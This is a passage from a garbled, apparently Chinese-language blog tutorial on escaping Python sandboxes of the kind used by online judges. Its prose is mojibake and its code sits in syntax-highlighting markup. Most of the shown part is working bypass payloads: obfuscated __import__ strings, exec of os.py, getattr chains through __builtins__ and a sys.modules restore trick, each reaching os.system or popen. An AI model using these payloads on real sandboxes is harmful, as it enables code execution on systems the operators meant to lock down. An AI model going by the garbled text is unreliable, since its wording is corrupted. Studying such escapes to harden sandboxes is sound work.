class="hljs-string">&#x27;zipimport&#x27;</span>, <span class="hljs-string">&#x27;_weakrefset&#x27;</span>, <span class="hljs-string">&#x27;gtweak&#x27;</span>, <span class="hljs-string">&#x27;readline&#x27;</span>, <span class="hljs-string">&#x27;zlib&#x27;</span>, <span class="hljs-string">&#x27;_yaml&#x27;</span>, <span class="hljs-string">&#x27;gzip&#x27;</span>, <span class="hljs-string">&#x27;reportlab&#x27;</span>, <span class="hljs-string">&#x27;zope&#x27;</span>, <span class="hljs-string">&#x27;abc&#x27;</span>, <span class="hljs-string">&#x27;hashlib&#x27;</span>, <span class="hljs-string">&#x27;reprlib&#x27;</span>, <span class="hljs-string">&#x27;aifc&#x27;</span>, <span class="hljs-string">&#x27;heapq&#x27;</span><br>]<br><br>methods = [<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>]<br><br>results = <span class="hljs-comment">&#123;&#125;</span><br><span class="hljs-keyword">for</span> <span class="hljs-keyword">module</span> <span class="hljs-keyword">in</span> all_modules_3:<br>    results[<span class="hljs-keyword">module</span>] = <span class="hljs-comment">&#123;</span><br><span class="hljs-comment">        &#x27;flag&#x27;: 0,</span><br><span class="hljs-comment">        &#x27;result&#x27;: &#123;&#125;</span><br>    &#125;<br><br>    <span class="hljs-keyword">try</span>:<br>        m = __import__(<span class="hljs-keyword">module</span>)<br>        attrs = dir(m)<br>        <span class="hljs-keyword">for</span> <span class="hljs-keyword">method</span> <span class="hljs-title function_">in</span> <span class="hljs-title function_">methods</span>:<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">method</span> <span class="hljs-title function_">in</span> <span class="hljs-title function_">attrs</span>:<br>                <span class="hljs-keyword">result</span> = <span class="hljs-string">&#x27;yes&#x27;</span><br>                results[<span class="hljs-keyword">module</span>][<span class="hljs-string">&#x27;flag&#x27;</span>] = <span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">result</span> = <span class="hljs-string">&#x27;no&#x27;</span><br><br>            results[<span class="hljs-keyword">module</span>][<span class="hljs-string">&#x27;result&#x27;</span>][<span class="hljs-keyword">method</span>] = <span class="hljs-title function_">result</span><br><br>    <span class="hljs-title function_">except</span> <span class="hljs-title function_">Exception</span> <span class="hljs-title function_">as</span> <span class="hljs-title function_">e</span>:<br>        print(e)<br><br><span class="hljs-keyword">for</span> <span class="hljs-keyword">result</span> <span class="hljs-keyword">in</span> results:<br>    <span class="hljs-keyword">if</span> results[<span class="hljs-keyword">result</span>][<span class="hljs-string">&#x27;flag&#x27;</span>]:<br>        print(<span class="hljs-string">&#x27;[+]&#x27;</span> + <span class="hljs-keyword">result</span>)<br>        <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> results[<span class="hljs-keyword">result</span>][<span class="hljs-string">&#x27;result&#x27;</span>]:<br>            print(<span class="hljs-string">&#x27;  [-]&#x27;</span> + r + <span class="hljs-string">&#x27;: &#x27;</span> + results[<span class="hljs-keyword">result</span>][<span class="hljs-string">&#x27;result&#x27;</span>][r])<br></code></pre></td></tr></table></figure></p>
<p><code>all_modules_2</code>å°±æ˜¯ 2.x çš„æ ‡å‡†åº“ï¼Œ<code>all_modules_3</code> å°±æ˜¯ 3.x çš„æ ‡å‡†åº“ã€‚</p>
<p>ç»“æœç›¸å½“å¤šï¼Œè¿™é‡Œå°±ä¸è´´äº†ã€‚è¿™é‡Œæ³¨æ„ä¸€ä¸‹ï¼Œè¿™ä¸ªæ–‡ä»¶åˆ«å‘½åä¸º <code>test.py</code>ï¼Œå¦‚æœå‘½åä¸º test ä¼šæ€ä¹ˆæ ·å‘¢ï¼Ÿå¯ä»¥å…ˆçŒœä¸€çŒœï¼Œåé¢ä¼šç»™è§£é‡Šã€‚</p>
<p>å¦‚æœ oj æ”¯æŒ <code>import</code> çš„è¯ï¼Œè¿™äº›åº“éƒ½æ˜¯é«˜å±çš„ï¼Œæ”¾ä»»ä¸ç®¡åŸºæœ¬ä¸Šæ˜¯åç­‰è¢«æ—¥ã€‚æ‰€ä»¥ä¸ºäº†é¿å…è¿‡æ»¤ä¸å®Œå–„å¯¼è‡´å„ç§é—®é¢˜ï¼Œåœ¨ Python æ²™ç®±å¥—ä¸€å±‚ docker è‚¯å®šä¸ä¼šæ˜¯åäº‹ã€‚</p>
<h3 id="èŠ±å¼-import">èŠ±å¼ import</h3>
<p>é¦–å…ˆï¼Œç¦ç”¨ <code>import os</code> è‚¯å®šæ˜¯ä¸è¡Œçš„ï¼Œå› ä¸º<br />
<figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-keyword">import</span>  os<br><span class="hljs-keyword">import</span>   os<br><span class="hljs-keyword">import</span>    os<br>...<br></code></pre></td></tr></table></figure><br />
éƒ½å¯ä»¥ã€‚å¦‚æœå¤šä¸ªç©ºæ ¼ä¹Ÿè¿‡æ»¤äº†ï¼ŒPython èƒ½å¤Ÿ import çš„å¯ä¸æ­¢ <code>import</code>ï¼Œè¿˜æœ‰ <code>__import__</code>ï¼š<code>__import__('os')</code>ï¼Œ<code>__import__</code>è¢«å¹²äº†è¿˜æœ‰ <code>importlib</code>ï¼š<code>importlib.import_module('os').system('ls')</code></p>
<p>è¿™æ ·å°±å®‰å…¨äº†å—ï¼Ÿå®é™…ä¸Š<code>import</code>å¯ä»¥é€šè¿‡å…¶ä»–æ–¹å¼å®Œæˆã€‚å›æƒ³ä¸€ä¸‹ import çš„åŸç†ï¼Œæœ¬è´¨ä¸Šå°±æ˜¯æ‰§è¡Œä¸€éå¯¼å…¥çš„åº“ã€‚è¿™ä¸ªè¿‡ç¨‹å®é™…ä¸Šå¯ä»¥ç”¨ <code>execfile</code> æ¥ä»£æ›¿ï¼š<br />
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">execfile</span><span class="hljs-params">(<span class="hljs-string">&#x27;/usr/lib/python2.7/os.py&#x27;</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">system</span><span class="hljs-params">(<span class="hljs-string">&#x27;ls&#x27;</span>)</span></span><br></code></pre></td></tr></table></figure><br />
ä¸è¿‡è¦æ³¨æ„ï¼Œ2.x æ‰èƒ½ç”¨ï¼Œ3.x åˆ äº† execfileï¼Œä¸è¿‡å¯ä»¥è¿™æ ·ï¼š<br />
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">with <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/usr/lib/python3.6/os.py&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>) as f:<br>    <span class="hljs-built_in">exec</span>(f<span class="hljs-selector-class">.read</span>())<br><br><span class="hljs-function"><span class="hljs-title">system</span><span class="hljs-params">(<span class="hljs-string">&#x27;ls&#x27;</span>)</span></span><br></code></pre></td></tr></table></figure><br />
è¿™ä¸ªæ–¹æ³•å€’æ˜¯ 2.xã€3.x é€šç”¨çš„ã€‚</p>
<p>ä¸è¿‡è¦ä½¿ç”¨ä¸Šé¢çš„è¿™ä¸¤ç§æ–¹æ³•ï¼Œå°±å¿…é¡»çŸ¥é“åº“çš„è·¯å¾„ã€‚å…¶å®åœ¨å¤§å¤šæ•°çš„ç¯å¢ƒä¸‹ï¼Œåº“éƒ½æ˜¯é»˜è®¤è·¯å¾„ã€‚å¦‚æœ sys æ²¡è¢«å¹²æ‰çš„è¯ï¼Œè¿˜å¯ä»¥ç¡®è®¤ä¸€ä¸‹ï¼Œï¼š<br />
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">import sys<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(sys.path)</span></span><br></code></pre></td></tr></table></figure></p>
<h3 id="èŠ±å¼å¤„ç†å­—ç¬¦ä¸²">èŠ±å¼å¤„ç†å­—ç¬¦ä¸²</h3>
<p>ä»£ç ä¸­è¦æ˜¯å‡ºç° <code>os</code>ï¼Œç›´æ¥ä¸è®©è¿è¡Œã€‚é‚£ä¹ˆå¯ä»¥åˆ©ç”¨å­—ç¬¦ä¸²çš„å„ç§å˜åŒ–æ¥å¼•å…¥ osï¼š<br />
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;so&#x27;</span><span class="hljs-selector-attr">[::-1]</span>)<span class="hljs-selector-class">.system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>)<br></code></pre></td></tr></table></figure></p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-tag">b</span> = <span class="hljs-string">&#x27;o&#x27;</span><br><span class="hljs-selector-tag">a</span> = <span class="hljs-string">&#x27;s&#x27;</span><br><span class="hljs-built_in">__import__</span>(a+b)<span class="hljs-selector-class">.system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>)<br></code></pre></td></tr></table></figure>
<p>è¿˜å¯ä»¥åˆ©ç”¨ <code>eval</code> æˆ–è€… <code>exec</code>ï¼š<br />
<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs lisp">&gt;&gt;&gt; eval(&#x27;)<span class="hljs-string">&quot;imaohw&quot;</span>(<span class="hljs-name">metsys</span>.)<span class="hljs-string">&quot;so&quot;</span>(<span class="hljs-name">__tropmi__</span>&#x27;[:<span class="hljs-symbol">:-1</span>])<br>macr0phag3<br><span class="hljs-number">0</span><br>&gt;&gt;&gt; exec(&#x27;)<span class="hljs-string">&quot;imaohw&quot;</span>(<span class="hljs-name">metsys</span>.so <span class="hljs-comment">;so tropmi&#x27;[::-1])</span><br>macr0phag3<br></code></pre></td></tr></table></figure></p>
<p>evalã€exec éƒ½æ˜¯ç›¸å½“å±é™©çš„å‡½æ•°ï¼Œexec æ¯” eval è¿˜è¦å±é™©ï¼Œå®ƒä»¬ä¸€å®šè¦è¿‡æ»¤ï¼Œå› ä¸ºå­—ç¬¦ä¸²æœ‰å¾ˆå¤šå˜å½¢çš„æ–¹å¼ï¼Œå¯¹å­—ç¬¦ä¸²çš„å¤„ç†å¯ä»¥æœ‰ï¼šé€†åºã€æ‹¼æ¥ã€base64ã€hexã€rot13...ç­‰ç­‰ï¼Œå¤ªå¤šäº†ã€‚ã€‚ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">[<span class="hljs-string">&#x27;__builtins__&#x27;</span>] == <br>[<span class="hljs-string">&#x27;\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f&#x27;</span>] == <br>[<span class="hljs-string">u&#x27;\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f&#x27;</span>] == <br>[<span class="hljs-string">&#x27;X19idWlsdGluc19f&#x27;</span>.decode(<span class="hljs-string">&#x27;base64&#x27;</span>)] == <br>[<span class="hljs-string">&#x27;__buil&#x27;</span>+<span class="hljs-string">&#x27;tins__&#x27;</span>] == <br>[<span class="hljs-string">&#x27;__buil&#x27;</span><span class="hljs-string">&#x27;tins__&#x27;</span>] == <br>[<span class="hljs-string">&#x27;__buil&#x27;</span>.__add__(<span class="hljs-string">&#x27;tins__&#x27;</span>)] == <br>[<span class="hljs-string">&quot;_builtins_&quot;</span>.join(<span class="hljs-string">&quot;__&quot;</span>)] == <br>[<span class="hljs-string">&#x27;%c%c%c%c%c%c%c%c%c%c%c%c&#x27;</span> % (<span class="hljs-number">95</span>, <span class="hljs-number">95</span>, <span class="hljs-number">98</span>, <span class="hljs-number">117</span>, <span class="hljs-number">105</span>, <span class="hljs-number">108</span>, <span class="hljs-number">116</span>, <span class="hljs-number">105</span>, <span class="hljs-number">110</span>, <span class="hljs-number">115</span>, <span class="hljs-number">95</span>, <span class="hljs-number">95</span>)]<br>...<br></code></pre></td></tr></table></figure>
<p>ä½ çœ‹çœ‹æœ€åé‚£ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œè¿™ä¸æ˜¯ç›´æ¥èµ·é£ï¼Ÿå•¥å­—ç¬¦æ„é€ ä¸äº†ï¼Ÿ</p>
<h3 id="æ¢å¤-sys.modules">æ¢å¤ sys.modules</h3>
<p><code>sys.modules</code> æ˜¯ä¸€ä¸ªå­—å…¸ï¼Œé‡Œé¢å‚¨å­˜äº†åŠ è½½è¿‡çš„æ¨¡å—ä¿¡æ¯ã€‚å¦‚æœ Python æ˜¯åˆšå¯åŠ¨çš„è¯ï¼Œæ‰€åˆ—å‡ºçš„æ¨¡å—å°±æ˜¯è§£é‡Šå™¨åœ¨å¯åŠ¨æ—¶è‡ªåŠ¨åŠ è½½çš„æ¨¡å—ã€‚æœ‰äº›åº“ä¾‹å¦‚ <code>os</code> æ˜¯é»˜è®¤è¢«åŠ è½½è¿›æ¥çš„ï¼Œä½†æ˜¯ä¸èƒ½ç›´æ¥ä½¿ç”¨ï¼ˆä½†æ˜¯å¯ä»¥é€šè¿‡ <code>sys.modules</code> æ¥ä½¿ç”¨ï¼Œä¾‹å¦‚ <code>sys.modules["os"]</code>ï¼‰ï¼ŒåŸå› åœ¨äº sys.modules ä¸­æœªç» import åŠ è½½çš„æ¨¡å—å¯¹å½“å‰ç©ºé—´æ˜¯ä¸å¯è§çš„ã€‚</p>
<p>å¦‚æœå°† os ä» sys.modules ä¸­å‰”é™¤ï¼Œos å°±å½»åº•æ²¡æ³•ç”¨äº†ï¼š<br />
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">&gt;&gt;&gt; sys.modules[<span class="hljs-string">&#x27;os&#x27;</span>] = <span class="hljs-string">&#x27;not allowed&#x27;</span><br>&gt;&gt;&gt; <span class="hljs-keyword">import</span> os<br>&gt;&gt;&gt; os.<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>)<br>Traceback (most recent <span class="hljs-keyword">call</span> last):<br>  File &quot;&lt;stdin&gt;&quot;, <span class="hljs-type">line</span> <span class="hljs-number">1</span>, <span class="hljs-keyword">in</span> &lt;module&gt;<br>AttributeError: <span class="hljs-string">&#x27;str&#x27;</span> <span class="hljs-keyword">object</span> has <span class="hljs-keyword">no</span> <span class="hljs-keyword">attribute</span> <span class="hljs-string">&#x27;system&#x27;</span><br>&gt;&gt;&gt;<br></code></pre></td></tr></table></figure></p>
<p>æ³¨æ„ï¼Œè¿™é‡Œä¸èƒ½ç”¨ <code>del sys.modules['os']</code>ï¼Œå› ä¸ºï¼Œå½“ import ä¸€ä¸ªæ¨¡å—æ—¶ï¼šimport Aï¼Œæ£€æŸ¥ sys.modules ä¸­æ˜¯å¦å·²ç»æœ‰ Aï¼Œå¦‚æœæœ‰åˆ™ä¸åŠ è½½ï¼Œå¦‚æœæ²¡æœ‰åˆ™ä¸º A åˆ›å»º module å¯¹è±¡ï¼Œå¹¶åŠ è½½ Aã€‚</p>
<p>æ‰€ä»¥åˆ äº† <code>sys.modules['os']</code> åªä¼šè®© Python é‡æ–°åŠ è½½ä¸€æ¬¡ osã€‚</p>
<p>çœ‹åˆ°è¿™ä½ è‚¯å®šå‘ç°äº†ï¼Œå¯¹äºä¸Šé¢çš„è¿‡æ»¤æ–¹å¼ï¼Œç»•è¿‡çš„æ–¹å¼å¯ä»¥æ˜¯è¿™æ ·ï¼š<br />
<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs clean">sys.modules[<span class="hljs-string">&#x27;os&#x27;</span>] = <span class="hljs-string">&#x27;not allowed&#x27;</span> # oj ä¸ºä½ åŠ çš„<br><br>del sys.modules[<span class="hljs-string">&#x27;os&#x27;</span>]<br><span class="hljs-keyword">import</span> os<br>os.<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>)<br></code></pre></td></tr></table></figure></p>
<p>æœ€åè¿˜æœ‰ä¸€ç§åˆ©ç”¨ <code>__builtins__</code> å¯¼å…¥çš„æ–¹å¼ï¼Œä¸‹é¢ä¼šè¯¦ç»†è¯´ã€‚</p>
<h3 id="èŠ±å¼æ‰§è¡Œå‡½æ•°">èŠ±å¼æ‰§è¡Œå‡½æ•°</h3>
<p>é€šè¿‡ä¸Šé¢å†…å®¹æˆ‘ä»¬å¾ˆå®¹æ˜“å‘ç°ï¼Œå…‰å¼•å…¥ os åªä¸è¿‡æ˜¯ç¬¬ä¸€æ­¥ï¼Œå¦‚æœæŠŠ system è¿™ä¸ªå‡½æ•°å¹²æ‰ï¼Œä¹Ÿæ²¡æ³•é€šè¿‡<code>os.system</code>æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œå¹¶ä¸”è¿™é‡Œçš„<code>system</code>ä¹Ÿä¸æ˜¯å­—ç¬¦ä¸²ï¼Œä¹Ÿæ²¡æ³•ç›´æ¥åšç¼–ç ç­‰ç­‰æ“ä½œã€‚æˆ‘é‡åˆ°è¿‡ä¸€ä¸ªç¯å¢ƒï¼Œç›´æ¥åœ¨<code>/usr/lib/python2.7/os.py</code>ä¸­åˆ äº†<code>system</code>å‡½æ•°ã€‚ã€‚ã€‚</p>
<p>ä¸è¿‡ï¼Œè¦æ˜ç¡®çš„æ˜¯ï¼Œos ä¸­èƒ½å¤Ÿæ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°æœ‰å¾ˆå¤šï¼š<br />
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-built_in">print</span>(<span class="hljs-built_in">os</span>.system(<span class="hljs-string">&#x27;whoami&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">os</span>.<span class="hljs-built_in">popen</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>).<span class="hljs-built_in">read</span>()) <br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">os</span>.popen2(<span class="hljs-string">&#x27;whoami&#x27;</span>).<span class="hljs-built_in">read</span>()) # <span class="hljs-number">2.</span>x<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">os</span>.popen3(<span class="hljs-string">&#x27;whoami&#x27;</span>).<span class="hljs-built_in">read</span>()) # <span class="hljs-number">2.</span>x<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">os</span>.popen4(<span class="hljs-string">&#x27;whoami&#x27;</span>).<span class="hljs-built_in">read</span>()) # <span class="hljs-number">2.</span>x<br>...<br></code></pre></td></tr></table></figure><br />
åº”è¯¥è¿˜æœ‰ä¸€äº›ï¼Œå¯ä»¥åœ¨è¿™é‡Œæ‰¾æ‰¾ï¼š<br />
<a target="_blank" rel="noopener" href="https://docs.python.org/2/library/os.html">2.x ä¼ é€é—¨ğŸšª</a><br />
<a target="_blank" rel="noopener" href="https://docs.python.org/3/library/os.html">3.x ä¼ é€é—¨ğŸšª</a><br />
è¿‡æ»¤<code>system</code>çš„æ—¶å€™è¯´ä¸å®šè¿˜æœ‰å…¶ä»–å‡½æ•°ç»™æ¼äº†ã€‚</p>
<p>å…¶æ¬¡ï¼Œå¯ä»¥é€šè¿‡ <code>getattr</code> æ‹¿åˆ°å¯¹è±¡çš„æ–¹æ³•ã€å±æ€§ï¼š<br />
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">import os<br><span class="hljs-function"><span class="hljs-title">getattr</span><span class="hljs-params">(os, <span class="hljs-string">&#x27;metsys&#x27;</span>[::-<span class="hljs-number">1</span>])</span><span class="hljs-params">(<span class="hljs-string">&#x27;whoami&#x27;</span>)</span></span><br></code></pre></td></tr></table></figure></p>
<p>ä¸è®©å‡ºç° import ä¹Ÿæ²¡äº‹ï¼š<br />
<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs lisp">&gt;&gt;&gt; getattr(<span class="hljs-name">getattr</span>(<span class="hljs-name">__builtins__</span>, &#x27;__tropmi__&#x27;[:<span class="hljs-symbol">:-1</span>])(&#x27;so&#x27;[:<span class="hljs-symbol">:-1</span>]), &#x27;metsys&#x27;[:<span class="hljs-symbol">:-1</span>])(&#x27;whoami&#x27;)<br>macr0phag3<br><span class="hljs-number">0</span><br></code></pre></td></tr></table></figure></p>
<p>ä¸€æ ·å¯ä»¥ã€‚è¿™ä¸ªæ–¹æ³•åŒæ ·å¯ä»¥ç”¨äºé€ƒé€¸è¿‡æ»¤ import çš„æ²™ç®±ã€‚å…³äº <code>__builtins__</code>ï¼Œè§ä¸‹æ–‡ã€‚</p>
<p>ä¸ <code>getattr</code> ç›¸ä¼¼çš„è¿˜æœ‰ <code>__getattr__</code>ã€<code>__getattribute__</code>ï¼Œå®ƒä»¬è‡ªå·±çš„åŒºåˆ«å°±æ˜¯<code>getattr</code>ç›¸å½“äº<code>class.attr</code>ï¼Œéƒ½æ˜¯è·å–ç±»å±æ€§/æ–¹æ³•çš„ä¸€ç§æ–¹å¼ï¼Œåœ¨è·å–çš„æ—¶å€™ä¼šè§¦å‘<code>__getattribute__</code>ï¼Œå¦‚æœ<code>__getattribute__</code>æ‰¾ä¸åˆ°ï¼Œåˆ™è§¦å‘<code>__getattr__</code>ï¼Œè¿˜æ‰¾ä¸åˆ°åˆ™æŠ¥é”™ã€‚æ›´å…·ä½“çš„è¿™é‡Œå°±ä¸è§£é‡Šäº†ï¼Œæœ‰å…´è¶£çš„è¯å¯ä»¥æœæœã€‚</p>
<h3 id="builtins__builtin__ä¸__builtins__">builtinsã€__builtin__ä¸__builtins__</h3>
<p>å…ˆè¯´ä¸€ä¸‹ï¼Œ<code>builtin</code>ã€<code>builtins</code>ï¼Œ<code>__builtin__</code>ä¸<code>__builtins__</code>çš„åŒºåˆ«ï¼š<br />
é¦–å…ˆæˆ‘ä»¬çŸ¥é“ï¼Œåœ¨ Python ä¸­ï¼Œæœ‰å¾ˆå¤šå‡½æ•°ä¸éœ€è¦ä»»ä½• import å°±å¯ä»¥ç›´æ¥ä½¿ç”¨ï¼Œä¾‹å¦‚<code>chr</code>ã€<code>open</code>ã€‚ä¹‹æ‰€ä»¥å¯ä»¥è¿™æ ·ï¼Œæ˜¯å› ä¸º Python æœ‰ä¸ªå«<code>å†…å»ºæ¨¡å—</code>ï¼ˆæˆ–è€…å«å†…å»ºå‘½åç©ºé—´ï¼‰çš„ä¸œè¥¿ï¼Œå®ƒæœ‰ä¸€äº›å¸¸ç”¨å‡½æ•°ï¼Œå˜é‡å’Œç±»ã€‚é¡ºä¾¿è¯´ä¸€ä¸‹ï¼ŒPython å¯¹å‡½æ•°ã€å˜é‡ã€ç±»ç­‰ç­‰çš„æŸ¥æ‰¾æ–¹å¼æ˜¯æŒ‰ <code>LEGB</code> è§„åˆ™æ¥æ‰¾çš„ï¼Œå…¶ä¸­ B å³ä»£è¡¨å†…å»ºæ¨¡å—ï¼Œè¿™é‡Œä¹Ÿä¸å†èµ˜è¿°äº†ï¼Œæœ‰å…´è¶£çš„æœæœå°±æ˜ç™½äº†ã€‚</p>
<p>åœ¨ 2.x ç‰ˆæœ¬ä¸­ï¼Œå†…å»ºæ¨¡å—è¢«å‘½åä¸º <code>__builtin__</code>ï¼Œåˆ°äº† 3.x å°±æˆäº† <code>builtins</code>ã€‚å®ƒä»¬éƒ½éœ€è¦ import æ‰èƒ½æŸ¥çœ‹ï¼š<br />
2.xï¼š<br />
<figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-keyword">import</span> __builtin__</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">__builtin__</span><br>&lt;module &#x27;__builtin__&#x27; (built-in)&gt;<br></code></pre></td></tr></table></figure></p>
<p>3.xï¼š<br />
<figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-keyword">import</span> builtins</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">builtins</span><br>&lt;module &#x27;builtins&#x27; (built-in)&gt;<br></code></pre></td></tr></table></figure></p>
<p>ä½†æ˜¯ï¼Œ<code>__builtins__</code> ä¸¤è€…éƒ½æœ‰ï¼Œå®é™…ä¸Šæ˜¯<code>__builtin__</code>å’Œ<code>builtins</code> çš„å¼•ç”¨ã€‚å®ƒä¸éœ€è¦å¯¼å…¥ï¼Œæˆ‘ä¼°è®¡æ˜¯ä¸ºäº†ç»Ÿä¸€ 2.x å’Œ 3.xã€‚ä¸è¿‡<code>__builtins__</code>ä¸<code>__builtin__</code>å’Œ<code>builtins</code>æ˜¯æœ‰ä¸€ç‚¹åŒºåˆ«çš„ï¼Œæ„Ÿå…´è¶£çš„è¯å»ºè®®æŸ¥ä¸€ä¸‹ï¼Œè¿™é‡Œå°±ä¸å•°å—¦äº†ã€‚ä¸ç®¡æ€ä¹ˆæ ·ï¼Œ<code>__builtins__</code> ç›¸å¯¹å®ç”¨ä¸€ç‚¹ï¼Œå¹¶ä¸”åœ¨ <code>__builtins__</code>é‡Œæœ‰å¾ˆå¤šå¥½ä¸œè¥¿ï¼š<br />
<figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-string">&#x27;__import__&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">dir</span>(__builtins__)</span><br>True<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">__builtins__.__dict__[<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;whoami&#x27;</span>)</span><br>macr0phag3<br>0<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-string">&#x27;eval&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">dir</span>(__builtins__)</span><br>True<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-string">&#x27;execfile&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">dir</span>(__builtins__)</span><br>True<br></code></pre></td></tr></table></figure></p>
<p>è¿™é‡Œç¨å¾®è§£é‡Šä¸‹ <code>x.__dict__</code> ï¼Œå®ƒæ˜¯ x å†…éƒ¨æ‰€æœ‰å±æ€§åå’Œå±æ€§å€¼ç»„æˆçš„å­—å…¸ï¼Œæœ‰ä»¥ä¸‹ç‰¹ç‚¹ï¼š</p>
<ol type="1">
<li>å†…ç½®çš„æ•°æ®ç±»å‹æ²¡æœ‰ <code>__dict__</code> å±æ€§</li>
<li>æ¯ä¸ªç±»æœ‰è‡ªå·±çš„ <code>__dict__</code> å±æ€§ï¼Œå°±ç®—å­˜ç€ç»§æ‰¿å…³ç³»ï¼Œçˆ¶ç±»çš„ <code>__dict__</code> å¹¶ä¸ä¼šå½±å“å­ç±»çš„ <code>__dict__</code></li>
<li>å¯¹è±¡ä¹Ÿæœ‰è‡ªå·±çš„ <code>__dict__</code> å±æ€§ï¼ŒåŒ…å« <code>self.xxx</code> è¿™ç§å®ä¾‹å±æ€§</li>
</ol>
<p>é‚£ä¹ˆæ—¢ç„¶<code>__builtins__</code>æœ‰è¿™ä¹ˆå¤šå±é™©çš„å‡½æ•°ï¼Œä¸å¦‚å°†é‡Œé¢çš„å±é™©å‡½æ•°ç ´åäº†ï¼š<br />
<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-variable">__builtins__</span>.<span class="hljs-variable">__dict__</span>[<span class="hljs-string">&#x27;eval&#x27;</span>] = <span class="hljs-string">&#x27;not allowed&#x27;</span><br></code></pre></td></tr></table></figure></p>
